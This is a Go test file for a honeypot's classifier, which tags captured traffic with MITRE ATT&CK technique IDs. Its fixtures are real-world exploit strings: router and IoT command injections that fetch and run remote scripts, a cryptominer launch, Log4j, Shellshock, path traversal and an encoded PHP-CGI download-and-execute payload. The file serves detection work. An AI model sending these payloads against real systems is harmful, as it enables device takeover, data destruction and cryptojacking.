package mitre

import (
	"reflect"
	"testing"

	"github.com/generalregulator/botbait/internal/model"
)

func ids(s Signals) []string {
	var out []string
	for _, t := range Classify(s) {
		out = append(out, t.ID)
	}
	return out
}

func TestClassifySOAPInjection(t *testing.T) {
	got := ids(Signals{
		Protocol:     "HTTP",
		Path:         "/UD/act?1",
		Text:         "<SOAP-ENV:Envelope><NewNTPServer1>`cd /tmp;rm -rf *;wget http://1.2.3.4/x;chmod +x x`</NewNTPServer1>",
		DownloadURLs: 1,
	})
	want := []string{"T1059.004", "T1105", "T1190"}
	if !reflect.DeepEqual(got, want) {
		t.Fatalf("got %v want %v", got, want)
	}
}

func TestClassifyADBShell(t *testing.T) {
	got := ids(Signals{Protocol: "ADB", Text: "OPEN shell:cd /data/local/tmp; chmod 777 miner; ./xmrig --donate-level 1"})
	want := []string{"T1059.004", "T1496"}
	if !reflect.DeepEqual(got, want) {
		t.Fatalf("got %v want %v", got, want)
	}
}

func TestClassifyTelnetBruteForceAndDiscovery(t *testing.T) {
	got := ids(Signals{Protocol: "TELNET", Credentials: 3, Text: "uname -a\n/bin/busybox ECCHI"})
	want := []string{"T1059.004", "T1082", "T1110.001"}
	if !reflect.DeepEqual(got, want) {
		t.Fatalf("got %v want %v", got, want)
	}
}

func TestBenignScanProducesNoTechniques(t *testing.T) {

	got := ids(Signals{Protocol: "HTTP", Path: "/", Text: "GET / HTTP/1.1\r\nHost: x\r\nUser-Agent: curl/7.68.0\r\n\r\n"})
	if len(got) != 0 {
		t.Fatalf("expected no techniques, got %v", got)
	}
	got = ids(Signals{Protocol: "HTTP", Path: "/", Text: "User-Agent: Wget/1.21 (linux-gnu)"})
	if len(got) != 0 {
		t.Fatalf("expected no techniques, got %v", got)
	}
}

func TestKnownExploitPathWithoutPayload(t *testing.T) {
	got := ids(Signals{Protocol: "HTTP", Path: "/boaform/admin/formLogin", Text: "POST /boaform/admin/formLogin"})
	if !reflect.DeepEqual(got, []string{"T1190"}) {
		t.Fatalf("got %v", got)
	}
}

func TestWebExploitRuleNotAppliedToNonHTTP(t *testing.T) {
	got := ids(Signals{Protocol: "TELNET", Text: "something | sh"})
	for _, id := range got {
		if id == "T1190" {
			t.Fatal("T1190 must be HTTP-only")
		}
	}
}

func techIDs(ts []model.Technique) []string {
	var out []string
	for _, t := range ts {
		out = append(out, t.ID)
	}
	return out
}

func TestStrictModeIgnoresPathOnlyHeuristics(t *testing.T) {
	paths := []string{"/cgi-bin/luci", "/.env", "/wp-content/plugins/x", "/manager/html", "/actuator/health"}
	for _, p := range paths {
		sig := Signals{Protocol: "HTTP", Path: p, Text: "GET " + p + " HTTP/1.1"}
		if got := Classify(sig); len(got) == 0 {
			t.Errorf("non-strict %s must still be tagged", p)
		}
		sig.Strict = true
		if got := Classify(sig); len(got) != 0 {
			t.Errorf("strict %s tagged %v", p, techIDs(got))
		}
	}
}

func TestStrictModeStillTagsRealInjectionAndSignatures(t *testing.T) {
	inj := Signals{Protocol: "HTTP", Strict: true, Path: "/x", Text: "PUT /x\n<language>$(wget http://203.0.113.9/a)</language>"}
	if !hasID(Classify(inj), "T1190") {
		t.Error("command substitution must be T1190 even in strict mode")
	}
	sig := Signals{Protocol: "HTTP", Strict: true, Path: "/SDK/webLanguage", Text: "x", Signature: "Hikvision CVE-2021-36260"}
	if !hasID(Classify(sig), "T1190") {
		t.Error("a confirmed signature must be T1190")
	}
}

func TestQueryParametersLikeShellWordsAreNotInjection(t *testing.T) {
	for _, text := range []string{"GET /a?x=1&cd=2 HTTP/1.1", "GET /a?q=1&sh=0&rm=1&nc=5 HTTP/1.1", "GET /a?b=1;chmod=777 HTTP/1.1"} {
		if got := Classify(Signals{Protocol: "HTTP", Strict: true, Path: "/a", Text: text}); len(got) != 0 {
			t.Errorf("%q tagged %v", text, techIDs(got))
		}
	}
	for _, text := range []string{"GET /a?x=1;wget http://h/x HTTP/1.1", "GET /a?x=1;wget${IFS}http://h/x HTTP/1.1", "GET /a?x=1&cd+/tmp HTTP/1.1", "GET /a?x=|sh HTTP/1.1"} {
		if !hasID(Classify(Signals{Protocol: "HTTP", Strict: true, Path: "/a", Text: text}), "T1190") {
			t.Errorf("%q must still be injection", text)
		}
	}
}

func hasID(ts []model.Technique, id string) bool {
	for _, t := range ts {
		if t.ID == id {
			return true
		}
	}
	return false
}

func TestStrictModeTagsPHPCGIArgumentInjectionWithEncodedPayload(t *testing.T) {
	text := "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1\nHost: x\n\n<?php shell_exec(base64_decode(\"KHdnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAtcU8tIGh0dHBzOi8vMjAzLjAuMTEzLjkvc2ggfHwgY3VybCAtc2sgaHR0cHM6Ly8yMDMuMC4xMTMuOS9zaCkgfCBzaCAtcyBhcGFjaGU=\"));die(); ?>"
	got := Classify(Signals{Protocol: "HTTP", Path: "/hello.world?%ADd+allow_url_include%3d1", Text: text, Strict: true})
	for _, id := range []string{"T1190", "T1059.004"} {
		found := false
		for _, tq := range got {
			found = found || tq.ID == id
		}
		if !found {
			t.Errorf("%s missing from %v", id, got)
		}
	}
}

func TestStrictModeIgnoresHarmlessPHPRequests(t *testing.T) {
	for _, text := range []string{
		"GET /index.php?id=3 HTTP/1.1\nHost: x\n\n",
		"GET /hello.world HTTP/1.1\nHost: x\n\n",
		"POST /contact.php HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\nname=a&msg=hello+php+shell",
		"GET /phpinfo.php HTTP/1.1\nHost: x\n\n",
	} {
		if got := Classify(Signals{Protocol: "HTTP", Path: "/x", Text: text, Strict: true}); len(got) != 0 {
			t.Errorf("%q -> %v", text, got)
		}
	}
}

func TestStrictModeStillCatchesCommonBotnetExploits(t *testing.T) {
	cases := map[string]string{
		"jaws shell":    "GET /shell?cd+/tmp;rm+-rf+*;wget+http://203.0.113.9/j+-O+sh;sh+sh HTTP/1.1\nHost: x\n\n",
		"tplink luci":   "POST /cgi-bin/luci/;stok=/locale?form=country HTTP/1.1\nHost: x\n\noperation=write&country=$(id>/tmp/x)",
		"gpon":          "POST /GponForm/diag_Form?images/ HTTP/1.1\nHost: x\n\nXWebPageName=diag&diag_action=ping&dest_host=;wget+http://203.0.113.9/a;sh+a",
		"log4j header":  "GET / HTTP/1.1\nHost: x\nUser-Agent: ${jndi:ldap://203.0.113.9/a}\n\n",
		"shellshock":    "GET /cgi-bin/status HTTP/1.1\nHost: x\nUser-Agent: () { :;}; /bin/sh -c 'id'\n\n",
		"traversal":     "GET /cgi-bin/../../../../etc/passwd HTTP/1.1\nHost: x\n\n",
		"hnap soap cmd": "POST /HNAP1/ HTTP/1.1\nSOAPAction: \"http://purenetworks.com/HNAP1/GetDeviceSettings/`id`\"\n\n",
	}
	for name, text := range cases {
		got := Classify(Signals{Protocol: "HTTP", Path: "/x", Text: text, Strict: true})
		found := false
		for _, tq := range got {
			found = found || tq.ID == "T1190"
		}
		if !found {
			t.Errorf("%s: T1190 missing, got %v", name, got)
		}
	}
}

func TestPayloadEvidenceIgnoresBarePaths(t *testing.T) {
	for in, want := range map[string]bool{
		"GET /.env HTTP/1.1":   false,
		"GET /ud/act HTTP/1.1": false,
		"GET /robots.txt":      false,
		"POST /x\n<u:SetNTPServers xmlns:u=\"urn:dslforum\">": true,
		"GET /shell?cd+/tmp;wget+http://a/b":                  true,
		"GET /cgi-bin/../../bin/sh":                           true,
	} {
		if got := PayloadEvidence(in); got != want {
			t.Errorf("PayloadEvidence(%q) = %v, want %v", in, got, want)
		}
	}
}
